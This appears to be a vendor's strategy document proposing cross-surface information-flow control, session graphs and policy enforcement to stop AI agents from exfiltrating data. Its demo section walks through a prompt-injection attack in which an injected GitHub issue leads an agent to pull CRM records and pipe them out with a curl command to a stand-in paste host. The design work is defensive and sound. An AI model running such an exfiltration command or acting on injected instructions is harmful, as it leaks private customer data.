# The moonshot: Obot Provenance, information-flow control for AI agents across every surface

## The thesis in one paragraph

Obot already sits in four places that no other vendor covers together:

- What enters the model's context, through the LLM gateway.
- What the agent does with tools, through the MCP gateway.
- What the agent does on a laptop, through Sentry hooks.
- What leaves a sandbox, through the Claude Environments egress gateway.

Right now those four act as separate products, each with its own logs and policies. The moonshot is to join them into one live, causal graph of every agent session, and then enforce rules about how information flows through that graph. For example: "data that came from Salesforce may not reach a non-approved destination in any session whose context also contains attacker-controllable content." The rule holds whether the agent tries a shell curl on a laptop, an MCP Slack call, an egress request from a sandbox, or a SaaS agent working through the gateway.

That is the "lethal trifecta" problem (private data + untrusted content + a way to communicate externally), solved at the infrastructure layer without changing the agents. Each incumbent sees only one link of the chain. EDR sees the shell but not why it ran. SASE sees the packet but not the prompt injection three steps earlier. IAM knows who the user is but not what the model read. Obot could see the whole chain.

This also answers the question in the market brief in your repo root: "What difficult capability would we demonstrably do better?" Gateways commoditize. The decision engine and the causal record are much harder to copy.

## Where things stand (grounded in the code)

The pieces are there, but they're siloed:

- Policies are spread across about 9 types: AccessControlRule, ModelAccessPolicy, SkillAccessRule, MCP filters (MCPWebhookValidation), guardrail policies, Sentry enforcement allowlists, MCPNetworkPolicy / egress rules, vMCP profiles, and Claude Environment profiles. Each has its own model, UI and enforcement point.
- Audit data is spread across separate persisters. In pkg/gateway/client/ there are auditlogpersister.go, egressauditpersister.go, enforcementdecisionpersister.go and devicescan.go, plus the LLM audit log. Correlation is mostly filtering by user, session or API key after the fact.
- Device enforcement ignores call parameters and history. pkg/enforcement/types.go says so: NormalizedCall is a "parameter-free description of a single tool call." Decisions are per call, with no memory of what came before in the session.
- Guardrails are the closest thing to a shared layer. pkg/guardrails already runs one engine with CEL conditions across LLM and MCP traffic. That pattern should grow to cover everything.
- Cross-replica correlation is a 24h protocol record, not a session model. MCPHookCorrelation exists only so a JSON-RPC response can be processed on a different replica than its request.

## The six pillars

### 1. Session graph: one causal record per agent session

- Define a unified event schema, natively aligned with the OpenTelemetry GenAI semantic conventions. Events: llm.turn, tool.call, tool.result, file.read, file.write, shell.exec, net.egress, delegation, approval.
- Stitch sessions across surfaces. Where possible, propagate a W3C traceparent-style Obot session ID: inject it into LLM gateway headers, vMCP connections and the egress gateway. Where agents won't propagate it, join on probabilistic keys: Claude Code's session_id appears both in hook payloads and in LLM request metadata, plus device ID, API key, time windows, and tool-call IDs that appear in both the LLM response and the MCP request.
- Model edges, not only events. "Tool result R was in the context window of LLM turn T, which emitted tool call C, whose arguments contain a span fingerprinted from R." The LLM gateway sees every message array, so Obot knows exactly what each turn was conditioned on. That is the unfair advantage.
- Ship a Session Replay UI: one timeline per session across laptop, gateway and sandbox. You scrub through it and see the context window, tool calls, shell commands and egress, with every policy decision and its reasoning inline.
- Report coverage honestly. Every session shows which surfaces were observed and which were blind. Security buyers trust a product that tells them what it can't see.

### 2. Data labels and lineage

- Capability labels on every tool, assigned automatically. Classify every catalog tool as reads-private, reads-untrusted (web, email, public issues, inbound tickets), writes-external, exec, destructive or credential-bearing. An LLM classifies from tool schemas and descriptions plus observed traffic; admins confirm. Labels are pinned to catalog snapshots, the same way vMCP pins components today.
- Content labels at ingestion. Every tool result or file read entering the context gets sensitivity labels (PII, secrets, customer data, regulated data) from the existing guardrail checkers (Presidio, secrets, regex, external classifiers) and a trust label (first-party or attacker-controllable).
- Two-tier propagation:
  - Conservative (the safety backstop): session-level taint. Once something enters the context, the session carries its labels until the context is compacted or reset. Paraphrasing by the model can't defeat this.
  - Precise (to cut false positives): fingerprint sensitive spans (shingles, MinHash, embeddings, exact match for structured identifiers like account numbers) and look for them in outbound tool arguments, shell commands and egress bodies. This yields lineage like: "these 14 email addresses in the Gmail send call came from the Salesforce query result at 10:04."
- Store fingerprints, not content, by default. Content stays under the existing customer-managed key paths (the aws/azure/gcp encryption configs).

### 3. One policy language compiled to every enforcement point

- Obot Policy: CEL-based (already in use in pkg/guardrails/cel.go) with a common vocabulary:
  - subject (user, groups, agent, device posture, delegation chain)
  - action (normalized across surfaces)
  - resource (tool, model, host, path)
  - session (labels, history, declared intent, risk score)
- Example:

      when session.labels.has("untrusted") && session.labels.has("confidential")
           && action.sink.external && !action.dest.in(org.approved_destinations)
      then require_approval(owner: subject.manager, ttl: 10m)

- One compiler, five targets:
  - LLM gateway plugin
  - MCP filter chain
  - Sentry decision endpoint, plus an offline policy bundle cached on the device
  - Claude Environments egress gateway
  - third-party enforcement points: an Envoy ext_authz adapter, a Kong plugin, agentgateway, Envoy AI Gateway
  The last target is strategic. Let gateways commoditize and make Obot the decision point behind everyone's gateway.
- The ~9 existing policy types become sugar over Obot Policy. Their UIs stay; the engine underneath is one.
- Shadow mode and historical simulation as a first-class feature: "Run this policy against the last 30 days of sessions." The output lists what would have been blocked, which approvals would have fired, and the false-positive rate, before anything is enforced. That alone shortens the buyer's evaluation from weeks to an afternoon.
- Natural-language authoring: "Don't let agents email customer data outside the company." The LLM drafts the CEL, generates test cases from real historical sessions, and shows the simulation. A human approves.

### 4. Interventions richer than allow/deny

- Step-up approval. Push the approval to Slack, Teams or mobile with the causal reason ("this session read GitHub issue #4411 (untrusted) and 14 PII records, and now wants to POST to pastebin.com"). Make it one tap, risk-scored, and batched. Learn from approvals to reduce approval fatigue.
- Quarantine mode (the CaMeL / dual-LLM pattern). When untrusted content would enter a session holding confidential data, the gateway routes it to a quarantined model that may only return schema-constrained data (e.g. {title, assignee, priority}), never free text that could carry instructions. This needs no agent changes, because Obot owns the LLM path.
- Credential downshift. Obot already brokers MCP OAuth and injects egress secrets. Mid-session, it swaps the user's GitHub token for a read-only one when the session becomes tainted.
- Escalation to a sandbox. "This task touches production credentials: continue it in a Claude Environment where egress is locked down." The laptop session hands off with its context.
- Surgical redaction of the specific lineage-matched spans, rather than blocking the whole call.
- A kill switch at org, user, agent or session scope, propagated to all four surfaces within seconds.

### 5. Intent-bound, just-in-time authority ("agent warrants")

- When a session starts, the user's task ("fix the flaky test in obot-platform/obot") is turned into a signed warrant: a narrow capability set (that repo, read/write; CI; no email, no Salesforce, no egress beyond the package registries) with a TTL.
- Downstream credentials are minted per action through RFC 8693 token exchange, with an "act" claim recording the delegation chain (user -> agent -> sub-agent). Tools see "Craig via Claude Code via sub-agent 3, warrant #abc", not a long-lived user token.
- Drift from the warrant isn't automatically blocked. It becomes a risk signal and an approval prompt: "the session wants to read Gmail, outside the declared task."
- Multi-agent delegation is handled correctly: a sub-agent's warrant can only be narrower than its parent's (attenuation, like macaroons or biscuits).
- This is the "agent identity / action authorization" niche the brief says might survive IAM bundling. Okta can say who the agent is. Only something that sees the session can say what this particular action was for.

### 6. Continuous assurance and evidence

- Honeytokens: Obot plants canary credentials and canary records (fake AWS keys, fake customer rows) in tool results and contexts. If one ever shows up in an outbound argument, a shell command, egress, or is used anywhere on the internet, that is definitive exfiltration evidence with zero false positives. Few things in security are this clean.
- Built-in red team: a continuously running harness that runs the 10 technical tests from the brief against the customer's own deployment:
  - model request
  - MCP read/write
  - OAuth delegation
  - unsafe arguments
  - prompt-injected tool output
  - direct shell
  - exfiltration
  - sensitive file access
  - multi-agent delegation
  - investigation trace
  It uses honeypot MCP servers with injection fixtures, and scores each surface as observed / detected / blocked / remediated.
- Evidence scorecards and compliance packs (EU AI Act, ISO 42001, SOC 2, NIST AI RMF) generated from real session data rather than questionnaires.
- Blast radius and least privilege:
  - For each user, agent and profile, compute what it could reach (tools x credentials x egress x data labels) against what it actually used.
  - Auto-propose tighter profiles, e.g. "this vMCP profile grants 140 tools, 11 were used in 90 days."
  - Simulate the proposal against history.
  - Apply it with one click.

## The killer demo (the 90-second sales cycle)

1. A developer's Claude Code session on their laptop reads a GitHub issue containing a hidden prompt injection (MCP, labelled untrusted).
2. The agent queries the CRM MCP server for "related customers" (confidential, 14 records fingerprinted).
3. The agent runs `curl -d @- https://paste.example` in the shell.
4. The Sentry hook asks the decision endpoint, which looks up the session graph: blocked. The developer sees exactly why, with links to the issue and the CRM call. Their manager gets a one-tap approval request. The security team gets a single incident containing the whole causal chain, not three unrelated alerts in three consoles.
5. Run the same attack in a Claude Environment: the same policy blocks it at the egress gateway.
6. Run it through a SaaS agent using the LLM gateway: the quarantined model strips the injection before it ever reaches the planner.
7. Show the honeytoken alert from a run with enforcement off: proof that the attack would have worked.

One policy, four surfaces, one trace. CrowdStrike can't explain why, Netskope never saw the prompt, and Okta never saw the data.

## 12-month plan (unlimited staffing, ~8 parallel teams)

Months 0-3: see everything
- Unified event schema and pipeline. Postgres stays the system of record; add a columnar store for analytics and a low-latency session-state store (target p99 under 5 ms for inline lookups).
- Session stitching across all four surfaces, plus Session Replay in the UI.
- Automatic tool capability labelling across catalogs.
- A lethal-trifecta detector in observe-only mode. This ships value on day 90 with zero enforcement risk.

Months 3-6: one brain
- Obot Policy language and compiler, with the LLM, MCP, Sentry and egress targets.
- Shadow mode and 30-day historical simulation.
- Natural-language authoring with auto-generated tests.
- Honeytokens.
- Existing policy types begin migrating onto the engine, keeping their UIs.

Months 6-9: act on it
- Inline flow control with session labels and fingerprint lineage.
- Step-up approvals (Slack, Teams, mobile), quarantine routing, credential downshift, kill switch.
- Warrants with RFC 8693 token exchange and delegation chains.
- Offline policy bundles for Sentry.

Months 9-12: prove it and become the decision point for everyone
- Continuous red team, evidence scorecards and compliance packs.
- Third-party enforcement adapters (Envoy ext_authz, Kong, agentgateway) and telemetry ingestion from EDR and SASE (CrowdStrike, SentinelOne, Netskope), so Obot fills gaps with their signals instead of competing with their sensors.
- Blast-radius graph and automatic least-privilege recommendations.

## The hard problems (and honest answers)

- The model paraphrases, so fingerprints miss. Correct. That's why session-level taint is the safety backstop and fingerprints only ever reduce false positives; they never grant permission.
- Approval fatigue. Risk-score and batch approvals, learn from them, and use shadow mode to tune policies before they ever page a human. Measure approvals per developer per week and set a budget for it.
- Latency. Make decisions from a precomputed session state, not graph queries on the hot path. Streams only need to be held when a redacting policy applies; the guardrails ADR already handles this for streamed output.
- Correlation gaps for agents that don't propagate IDs. Probabilistic joins, plus displaying coverage honestly. Then push an open "agent session context" header standard through the MCP spec and OTel; Obot is well placed to author it.
- Storing context windows is a privacy liability. Keep fingerprints and labels by default, put content behind customer-managed keys, and apply role-gated access as audit content already does.
- Scope creep into hosting or orchestration. Don't. Claude Environments is an enforcement point, not a cloud business. The brief is right that hyperscalers win that race.

## Why this is the right bet

It turns Obot's breadth (which the brief warns "is not the same as commercial power") into a capability that only exists because of that breadth. It gives security buyers something to purchase separately that their existing tools can't do: cross-surface prevention with a causal explanation. It gives platform teams shadow-mode simulation, so rollout is safe. And it makes the commoditizing parts (LLM routing, MCP federation) into sensors and enforcement points for a decision engine and session graph that are hard to replicate.
